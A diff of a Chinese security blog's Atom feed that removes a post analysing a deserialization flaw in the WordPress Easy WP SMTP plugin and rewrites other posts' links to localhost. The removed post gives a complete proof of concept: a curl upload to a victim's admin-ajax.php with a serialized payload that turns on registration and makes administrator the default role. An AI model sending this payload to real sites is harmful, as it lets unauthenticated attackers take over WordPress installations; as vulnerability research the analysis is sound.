@@ -1,131 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-21T16:46:20+08:00</updated><id>/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">WordPress Easy WP SMTP反序列化漏洞分析</title><link href="/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp/" rel="alternate" type="text/html" title="WordPress Easy WP SMTP反序列化漏洞分析" /><published>2019-03-21T16:31:21+08:00</published><updated>2019-03-21T16:31:21+08:00</updated><id>/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp</id><content type="html" xml:base="/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp/">&lt;p&gt;
-	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。&lt;/strong&gt;&lt;/span&gt;
-&lt;/p&gt;
-
-&lt;p&gt;首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
-下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。&lt;/p&gt;
-
-&lt;p&gt;关键函数位置在：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。&lt;/p&gt;
-
-&lt;p&gt;然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
-/wp-admin/admin.php的注释里对admin_init解释道：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：&lt;/p&gt;
-
-&lt;p&gt;网上给出的poc：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;网上的poc是利用函数中的一个导入配置文件的功能：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;在导入以后，他会对文件内容进行一个反序列化解析：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;我们可以使用下面的array:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;序列化以后成为：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;再次组合array：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(81)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;a:2:{s:18:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;users_can_register&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:1:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:12:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;default_role&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:13:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;checksum&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(32)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:2:{s:4:&quot;data&quot;;s:81:&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;;s:8:&quot;checksum&quot;;s:32:&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;;}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
-if ( empty( $in[ 'data' ] ) ) {
-	 echo $err_msg;
-	 wp_die();
-}
-if ( empty( $in[ 'checksum' ] ) ) {
-	 echo $err_msg;
-	 wp_die();
-}
-if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
-	 echo $err_msg;
-	 wp_die();
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;我们可以看到，需要绕过两个部分：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize( $in_raw );
-unserialize( $in['data'] )
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;经过两次反序列化的结果后，data的内容，也就是下面的数组：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;才能分拆为key-value，进入后续函数：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foreach ( $data as $key =&amp;gt; $value ) 
-{
-	    update_option( $key, $value );
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
-到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…&lt;/p&gt;
-
-&lt;p&gt;下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/wp-includes/option.php::update_option
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$value = apply_filters( &quot;pre_update_option_{$option}&quot;, $value, $old_value, $option );
-$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
-	
-if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
-{
-	return false;
-}
-
-$result = $wpdb-&amp;gt;update( $wpdb-&amp;gt;options, $update_args, array( 'option_name' =&amp;gt; $option ) );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;附上数据库wp_options表查询的最初始的默认结果：
-&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;手慢很少写分析漏洞文章，可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。&lt;/p&gt;
-
-&lt;p&gt;引用文章：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/&quot;&gt;Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</summary></entry><entry><title type="html">分布式扫描填坑杂谈</title><link href="/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-03-22T15:13:55+08:00</updated><id>http://localhost:4000/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">分布式扫描填坑杂谈</title><link href="http://localhost:4000/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>http://localhost:4000/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="http://localhost:4000/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -306,7 +179,7 @@ celery -A proj worker -l info -P eventlet
 
 &lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;
 
-&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
+&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="http://localhost:4000/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>http://localhost:4000/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="http://localhost:4000/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
 	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -497,7 +370,7 @@ wyproxy的衍生扫描器
 
 &lt;p&gt;笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。&lt;/p&gt;
 
-&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry><entry><title type="html">浅谈漏扫之插件篇</title><link href="/scanner/2018/10/08/scanner-plugins/" rel="alternate" type="text/html" title="浅谈漏扫之插件篇" /><published>2018-10-08T12:37:38+08:00</published><updated>2018-10-08T12:37:38+08:00</updated><id>/scanner/2018/10/08/scanner-plugins</id><content type="html" xml:base="/scanner/2018/10/08/scanner-plugins/">&lt;p&gt;
+&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry><entry><title type="html">浅谈漏扫之插件篇</title><link href="http://localhost:4000/scanner/2018/10/08/scanner-plugins/" rel="alternate" type="text/html" title="浅谈漏扫之插件篇" /><published>2018-10-08T12:37:38+08:00</published><updated>2018-10-08T12:37:38+08:00</updated><id>http://localhost:4000/scanner/2018/10/08/scanner-plugins</id><content type="html" xml:base="http://localhost:4000/scanner/2018/10/08/scanner-plugins/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -721,7 +594,7 @@ for vuln_path in vuln_paths:
 
 &lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;
 
-&lt;p&gt;上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</summary></entry><entry><title type="html">浅谈漏扫之加速篇</title><link href="/scanner/2018/09/03/scanner-faster/" rel="alternate" type="text/html" title="浅谈漏扫之加速篇" /><published>2018-09-03T12:48:18+08:00</published><updated>2018-09-03T12:48:18+08:00</updated><id>/scanner/2018/09/03/scanner-faster</id><content type="html" xml:base="/scanner/2018/09/03/scanner-faster/">&lt;p&gt;
+&lt;p&gt;上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</summary></entry><entry><title type="html">浅谈漏扫之加速篇</title><link href="http://localhost:4000/scanner/2018/09/03/scanner-faster/" rel="alternate" type="text/html" title="浅谈漏扫之加速篇" /><published>2018-09-03T12:48:18+08:00</published><updated>2018-09-03T12:48:18+08:00</updated><id>http://localhost:4000/scanner/2018/09/03/scanner-faster</id><content type="html" xml:base="http://localhost:4000/scanner/2018/09/03/scanner-faster/">&lt;p&gt;
 	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -1237,7 +1110,7 @@ Task: 获取插件，执行任务，输出报告。
 &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/PrettyTom/p/6582357.html&quot;&gt;Python的多进程&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://www.chabug.org/tools/553.html&quot;&gt;[X1r0z]模拟bugscan node的通信机制及在线体验
-&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</summary></entry><entry><title type="html">浅谈进程隐藏之术</title><link href="/cert/2018/07/04/hide-process/" rel="alternate" type="text/html" title="浅谈进程隐藏之术" /><published>2018-07-04T19:30:38+08:00</published><updated>2018-07-04T19:30:38+08:00</updated><id>/cert/2018/07/04/hide-process</id><content type="html" xml:base="/cert/2018/07/04/hide-process/">&lt;p&gt;
+&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</summary></entry><entry><title type="html">浅谈进程隐藏之术</title><link href="http://localhost:4000/cert/2018/07/04/hide-process/" rel="alternate" type="text/html" title="浅谈进程隐藏之术" /><published>2018-07-04T19:30:38+08:00</published><updated>2018-07-04T19:30:38+08:00</updated><id>http://localhost:4000/cert/2018/07/04/hide-process</id><content type="html" xml:base="http://localhost:4000/cert/2018/07/04/hide-process/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -1539,7 +1412,7 @@ deskthrd
 
 &lt;p&gt;需要强调的是，攻防都是相对的，技术是在进步的，工具需要配合手工才能变成神器。&lt;/p&gt;
 
-&lt;p&gt;以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="cert" /><summary type="html">前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</summary></entry><entry><title type="html">信安应急响应手册</title><link href="/pentest/2018/06/25/security-emergency/" rel="alternate" type="text/html" title="信安应急响应手册" /><published>2018-06-25T12:56:18+08:00</published><updated>2018-06-25T12:56:18+08:00</updated><id>/pentest/2018/06/25/security-emergency</id><content type="html" xml:base="/pentest/2018/06/25/security-emergency/">&lt;p&gt;
+&lt;p&gt;以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="cert" /><summary type="html">前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</summary></entry><entry><title type="html">信安应急响应手册</title><link href="http://localhost:4000/pentest/2018/06/25/security-emergency/" rel="alternate" type="text/html" title="信安应急响应手册" /><published>2018-06-25T12:56:18+08:00</published><updated>2018-06-25T12:56:18+08:00</updated><id>http://localhost:4000/pentest/2018/06/25/security-emergency</id><content type="html" xml:base="http://localhost:4000/pentest/2018/06/25/security-emergency/">&lt;p&gt;
 	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -2590,7 +2463,7 @@ export HISTTIMEFORMAT=&quot;%F %T 'who -u am i 2&amp;gt;/dev/null| awk '{print $
 
 &lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
 
-&lt;p&gt;本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</summary></entry><entry><title type="html">关于selenium的post方法思考</title><link href="/spider/2018/04/18/selenium-post-func/" rel="alternate" type="text/html" title="关于selenium的post方法思考" /><published>2018-04-18T00:08:18+08:00</published><updated>2018-04-18T00:08:18+08:00</updated><id>/spider/2018/04/18/selenium-post-func</id><content type="html" xml:base="/spider/2018/04/18/selenium-post-func/">&lt;p&gt;
+&lt;p&gt;本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</summary></entry><entry><title type="html">关于selenium的post方法思考</title><link href="http://localhost:4000/spider/2018/04/18/selenium-post-func/" rel="alternate" type="text/html" title="关于selenium的post方法思考" /><published>2018-04-18T00:08:18+08:00</published><updated>2018-04-18T00:08:18+08:00</updated><id>http://localhost:4000/spider/2018/04/18/selenium-post-func</id><content type="html" xml:base="http://localhost:4000/spider/2018/04/18/selenium-post-func/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。&lt;/strong&gt;&lt;/span&gt;
 	
 &lt;/p&gt;
@@ -2692,7 +2565,7 @@ resp = driver.execute_script(&quot;return &quot; + ajax_query)
 
 &lt;p&gt;总而言之，selenium没有自带原生post方式是一个遗憾，而且其调用headless模式的浏览器，渲染和启动也显得太慢了些，无法用于高并发。&lt;/p&gt;
 
-&lt;p&gt;还是那句话，个人觉得在资源有限的情况下，它不太适用于高并发的大规模测试，fuzz指定的一定量payload也许尚可。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="spider" /><summary type="html">Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。</summary></entry><entry><title type="html">内网横向与后渗透辞典</title><link href="/pentest/2018/01/18/pentest-innet-and-permission-maintenance/" rel="alternate" type="text/html" title="内网横向与后渗透辞典" /><published>2018-01-18T01:14:18+08:00</published><updated>2018-01-18T01:14:18+08:00</updated><id>/pentest/2018/01/18/pentest-innet-and-permission-maintenance</id><content type="html" xml:base="/pentest/2018/01/18/pentest-innet-and-permission-maintenance/">&lt;p&gt;
+&lt;p&gt;还是那句话，个人觉得在资源有限的情况下，它不太适用于高并发的大规模测试，fuzz指定的一定量payload也许尚可。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="spider" /><summary type="html">Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。</summary></entry><entry><title type="html">内网横向与后渗透辞典</title><link href="http://localhost:4000/pentest/2018/01/18/pentest-innet-and-permission-maintenance/" rel="alternate" type="text/html" title="内网横向与后渗透辞典" /><published>2018-01-18T01:14:18+08:00</published><updated>2018-01-18T01:14:18+08:00</updated><id>http://localhost:4000/pentest/2018/01/18/pentest-innet-and-permission-maintenance</id><content type="html" xml:base="http://localhost:4000/pentest/2018/01/18/pentest-innet-and-permission-maintenance/">&lt;p&gt;
 	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -3720,7 +3593,7 @@ Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定�
 &lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;
 
